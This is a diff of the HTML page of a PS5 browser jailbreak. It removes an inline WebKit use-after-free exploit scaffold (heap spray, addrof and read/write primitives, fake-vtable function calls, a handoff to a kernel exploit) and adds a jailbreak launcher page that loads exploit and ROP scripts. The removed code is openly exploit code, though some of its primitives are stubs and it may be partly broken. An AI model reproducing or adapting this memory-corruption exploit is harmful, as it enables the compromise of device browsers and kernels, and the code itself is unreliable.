@@ -1,177 +1,168 @@
-<!DOCTYPE html>
-<html>
+<html manifest="cache.appcache">
+
 <head>
-<meta charset="utf-8">
+    <title>PS5 UMTX Jailbreak</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="main.css">
+
+    <script defer src="int64.js"></script>
+    <script defer src="rop.js"></script>
+    <script defer src="exploit.js"></script>
+    <script defer src="custom_host_stuff.js"></script>
+    <script defer src="appcache_handler.js"></script>
+    <script defer src="module/utils.js"></script>
+    <script defer src="module/constants.js"></script>
+    <script defer src="module/int64.js"></script>
+    <script defer src="module/mem.js"></script>
+    <script defer src="module/memtools.js"></script>
+    <script defer src="module/rw.js"></script>
+    <script defer src="module/syscalls.js"></script>
+    <script defer src="webkit_psfree.js"></script>
+    <script defer src="webkit_fontface.js"></script>
+    <script>
+        addEventListener('unhandledrejection', (event) => {
+            const reason = event.reason;
+            // We log the line and column numbers as well since some exceptions (like
+            // SyntaxError) do not show it in the stack trace.
+            alert(
+                `${reason}\n`
+                + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
+                + `${reason.stack}`
+            );
+            //alert(reason);
+            throw reason;
+        });
+        window.addEventListener('load', function () {
+            onload_setup();
+        }, false);
+    </script>
+    <style>
+        .log {
+            display: block;
+            unicode-bidi: embed;
+            font-family: monospace;
+            white-space: pre;
+            font-size: 18px;
+            width: 100%;
+            height: 80%;
+            margin-top: 50px;
+            border: none;
+        }
+    </style>
 </head>
+
 <body>
-<script src="p2jb.js"></script>
-<script>
-"use strict";
-
-class Int64 {
-    constructor(low, high) {
-        this.low = (low >>> 0);
-        this.high = (high >>> 0);
-    }
-    add32(val) {
-        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        let new_hi = (this.high >>> 0);
-        if (new_lo < this.low) new_hi++;
-        return new Int64(new_lo, new_hi);
-    }
-}
-
-let uaf_victim_arr = [1.1, 2.2, 3.3];
-
-function setup_primitives(uaf_addrof, uaf_write8) {
-    let master = new Uint32Array(0x1000);
-    let slave = new Uint8Array(0x1000);
-    let slave_u32 = new Uint32Array(slave.buffer);
-
-    let master_addr = uaf_addrof(master);
-    let slave_addr = uaf_addrof(slave);
-
-    uaf_write8(master_addr.add32(0x10), slave_addr.add32(0x10));
-
-    function get_ref_addr(obj) {
-        uaf_victim_arr[0] = obj;
-        return uaf_addrof(obj);
-    }
-
-    function readuint(addr, size) {
-        master[0] = addr.low;
-        master[1] = addr.high;
-        if (size === 4) return slave_u32[0];
-        if (size === 8) return new Int64(slave_u32[0], slave_u32[1]);
-        return 0;
-    }
-
-    function writeuint(addr, val, size) {
-        master[0] = addr.low;
-        master[1] = addr.high;
-        if (size === 4) {
-            slave_u32[0] = val;
-        } else if (size === 8) {
-            slave_u32[0] = val.low !== undefined ? val.low : val;
-            slave_u32[1] = val.high !== undefined ? val.high : 0;
-        }
-    }
-
-    window.p = {
-        addrof: get_ref_addr,
-        fakeobj: function(addr) { return null; },
-        read8: function(addr) { return readuint(addr, 8); },
-        write8: function(addr, val) { writeuint(addr, val, 8); },
-        write4: function(addr, val) { writeuint(addr, val, 4); },
-        write1: function(addr, val) {
-            master[0] = addr.low;
-            master[1] = addr.high;
-            slave[0] = val;
-        },
-        malloc: function(size) {
-            let ab = new ArrayBuffer(size);
-            return get_ref_addr(ab).add32(0x10);
-        },
-        syscall: function(sysnum, ...args) { return new Int64(0, 0); },
-        fcall: function(func_ptr, ...args) {
-            let wrapper = document.createElement("div");
-            let wrapper_addr = get_ref_addr(wrapper);
-            let vtable_addr = readuint(wrapper_addr.add32(0x18), 8);
+    <svg style="display: none" version="2.0">
+        <defs>
+            <symbol id="delete-icon" viewBox="0 -960 960 960">
+                <path
+                    d="m376-300 104-104 104 104 56-56-104-104 104-104-56-56-104 104-104-104-56 56 104 104-104 104 56 56Zm-96 180q-33 0-56.5-23.5T200-200v-520h-40v-80h200v-40h240v40h200v80h-40v520q0 33-23.5 56.5T680-120H280Zm400-600H280v520h400v-520Zm-400 0v520-520Z" />
+            </symbol>
+            <symbol id="forward-arrow-icon" viewBox="0 -960 960 960" >
+                <path d="M647-440H160v-80h487L423-744l57-56 320 320-320 320-57-56 224-224Z"/>
+            </symbol>
             
-            let fake_vtable = this.malloc(0x200);
-            for(let i=0; i<0x200; i+=8) {
-                writeuint(fake_vtable.add32(i), readuint(vtable_addr.add32(i), 8), 8); 
-            }
-            
-            writeuint(fake_vtable.add32(0x80), func_ptr, 8); 
-            writeuint(wrapper_addr.add32(0x18), fake_vtable, 8);
-            
-            if(args.length > 0) writeuint(wrapper_addr.add32(0x20), args[0], 8);
-            if(args.length > 1) writeuint(wrapper_addr.add32(0x28), args[1], 8);
-            
-            wrapper.scrollLeft; 
-            
-            writeuint(wrapper_addr.add32(0x18), vtable_addr, 8);
-            return new Int64(0, 0);
-        },
-        dlsym_init: function() {}
-    };
-}
+        </defs>
+    </svg>
 
-window.onload = () => {
-    if (typeof _logToPage === "function") _logToPage("[+] Booting PR 66294 Exploit via CustomElements...");
-
-    let didRun = false;
+    <div id="toast-container"></div>
     
-    // We use a Custom Element callback instead of TrustedTypes to pause execution during the UAF.
-    // This works on PS5 where TrustedTypes throws a ReferenceError.
-    class TriggerElement extends HTMLElement {
-        connectedCallback() {
-            if (didRun) return;
-            didRun = true;
+    <div id="redirector-view"
+        style="min-width: 100%; max-width: 100%; position: absolute; top: 0; left: -100%; min-height: 100%; max-height: 100%;">
+        <div style="overflow-y: scroll; width: 100%;max-height: 100vh;min-height: 100vh;" id="redirector-view-inner">
+            <h3 style="text-align: center;">Redirector</h3>
+            <div style="padding: 25px;padding-top: 0; display: flex;">
+                <input id="redirector-input" type="text" value="http://"
+                    style="width: 100%; border-radius: 10px; padding: 15px; background-color: #223; color: #fff; border-color: #334; font-size: 20px;" />
+                <a class="btn icon-btn" style="width: 100px;" tabindex="0" onclick="redirectorGo()">
+                    <svg width="32px" height="32px" fill="#ddd">
+                        <use href="#forward-arrow-icon" />
+                    </svg>
+                </a>
+            </div>
 
-            if (typeof _logToPage === "function") _logToPage("[+] Triggering Garbage Collection...");
+            <div style="display: flex; flex-direction: row; max-width: 100%; padding-left: 50px; padding-right: 50px;">
+                <div style="width: 60%; margin-right: 35px; " id="redirector-pinned"></div>
+                <div style="width: 1px; background-color: #557; margin-top: 10px;"></div>
+                <div style="width: 40%; margin-left: 35px; " id="redirector-history"></div>
+            </div>
+        </div>
+    </div>
 
-            // 1. Force GC to definitively free the Node object
-            let gc_arr = [];
-            for (let i = 0; i < 20; i++) {
-                gc_arr.push(new ArrayBuffer(0x1000000));
-            }
+    <div id="center-view" style="position: absolute; top: 0; left: 0; width: 100%; min-height: 100%;">
 
-            if (typeof _logToPage === "function") _logToPage("[+] Spraying memory to reclaim Node object...");
+        <div style="margin-top: 15px; position: absolute; width: 100%;">
+            <h1 style="text-align: center;">PS5 UMTX Jailbreak (1.xx-5.xx)</h1>
+            <p id="current-fw" class="text-secondary"
+                style="text-align: center; margin-bottom: 8px; padding-bottom: 0;">
+            </p>
 
-            // 2. Reclaim the freed memory using Array overlap
-            let spray = [];
-            let marker = new Int64(0x13371337, 0x13371337);
-            for (let i = 0; i < 10000; i++) {
-                let reclaimed_obj = new Array(0x20);
-                reclaimed_obj[0] = marker; 
-                spray.push(reclaimed_obj);
-            }
-            
-            let my_uaf_addrof = function(obj) {
-                uaf_victim_arr[0] = obj;
-                for(let i=0; i<spray.length; i++) {
-                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
-                        return new Int64(spray[i][2], spray[i][3]);
-                    }
-                }
-                return new Int64(0, 0); 
-            };
+            <p id="listening-ip" class="text-secondary" style="text-align: center; margin-top: 0; padding-top: 0;">
+                <br />
+            </p>
+        </div>
+        <div style="position: absolute; margin: 20px; margin-right:28px; bottom: 0; right: 0px;" class="opacity-transition" id="l2-redirect">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 35px;">
+                <div >
+                    <span style="vertical-align: middle;display: inline-block;                ">
+                        <svg viewbox="0 0 79 61" xmlns="http://www.w3.org/2000/svg" style="width: 32px; height:32px;">
+                            <rect x="0" y="0" width="79" height="61" rx="13" ry="13" fill="#bdc0c2" />
+                            <text x="50%" y="50%" dy="17.5px" text-anchor="middle" fill="#4e4e4e" font-size="50"
+                                font-weight="bold">L2</text>
+                        </svg>
+                    </span>
+                    <span
+                        style="font-size: 18px; vertical-align: middle;display: inline-block; margin-left: 8px; font-weight: bold; color: #fff;">Redirect</span>
+                </div>
+                <div >
+                    <span style="vertical-align: middle;display: inline-block;                ">
+                        <svg viewbox="0 0 79 61" xmlns="http://www.w3.org/2000/svg" style="width: 32px; height:32px;">
+                            <rect x="0" y="0" width="79" height="61" rx="13" ry="13" fill="#bdc0c2" />
+                            <text x="50%" y="50%" dy="17.5px" text-anchor="middle" fill="#4e4e4e" font-size="50"
+                                font-weight="bold">R2</text>
+                        </svg>
+                    </span>
+                    <span
+                        style="font-size: 18px; vertical-align: middle;display: inline-block; margin-left: 8px; font-weight: bold; color: #fff;">Options</span>
+                </div>
+            </div>
+        </div>
 
-            let my_uaf_write8 = function(addr, val) {
-                for(let i=0; i<spray.length; i++) {
-                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
-                        spray[i][4] = addr.low;
-                        spray[i][5] = addr.high;
-                        break;
-                    }
-                }
-            };
+        <div>
+            <div id="console-parent" class="opacity-transition"
+                style="display: flex; justify-content: center; align-items: center; position: absolute; top: 0;left: 0; width: 100%; height: 100%;">
+                <textarea id="console" class="log"></textarea>
+            </div>
 
-            if (typeof _logToPage === "function") _logToPage("[+] Building Read/Write Master/Slave primitives...");
-            setup_primitives(my_uaf_addrof, my_uaf_write8);
-            
-            if (typeof p2jb === 'function') {
-                if (typeof _logToPage === "function") _logToPage("[+] Success! Handing over to p2jb kernel exploit...");
-                setTimeout(p2jb, 100); 
-            } else {
-                if (typeof _logToPage === "function") _logToPage("[-] Error: p2jb.js is not loaded.");
-            }
-        }
-    }
+            <div id="run-jb-parent" class="opacity-transition"
+                style="display: flex; justify-content: center; align-items: center; position: absolute; top: 0;left: 0; width: 100%; height: 100%;">
+                <a tabindex="0" class="btn" style="max-width: 50%;" id="run-jb" onclick="runJailbreak()">Jailbreak</a>
+            </div>
 
-    customElements.define('x-trigger', TriggerElement);
-
-    const range = document.createRange();
-    let div = document.createElement('div');
-    range.setStart(div, 0);
-    range.setEnd(div, 0);
-
-    // The createContextualFragment call triggers the vulnerability.
-    // It creates the x-trigger element, appending it to the fragment, firing connectedCallback synchronously while the reference is vulnerable.
-    range.createContextualFragment('<x-trigger></x-trigger>');
-};
-</script>
+            <center style="position: fixed;bottom: 0;width: 100%;margin-bottom: 10px;font-size: 13px;"
+                class="info opacity-transition" id="credits">
+                <b id="version">v1.2</b><br />
+                <span>creds & greetz</span>
+                <h3>
+                    <a href="https://x.com/fail0verflow">@fail0verflow</a>, 
+                    <a href="https://twitter.com/flat_z">@flat_z</a>, 
+                    <a href="https://twitter.com/SpecterDev">@SpecterDev</a>, 
+                    ChendoChap, 
+                    SlidyBat, 
+                    abc/psfree, 
+                    <br />
+                    idlesauce, 
+                    <a href="https://x.com/znullptr">@znullptr</a>, 
+                    <a href="https://twitter.com/notnotzecoxao">@notnotzecoxao</a>, 
+                    <a href="https://twitter.com/SocraticBliss">@SocraticBliss</a>, 
+                    <a href="https://github.com/john-tornblom">John Tornblom</a>, 
+                    <a href="https://discord.gg/kbrzGuH3F6">PS5 R&D Discord</a>
+                </h3>
+            </center>
+        </div>
+    </div>
+    <script>
+        document.getElementById("console-parent").style.opacity = 0;
+    </script>
 </body>
 </html>
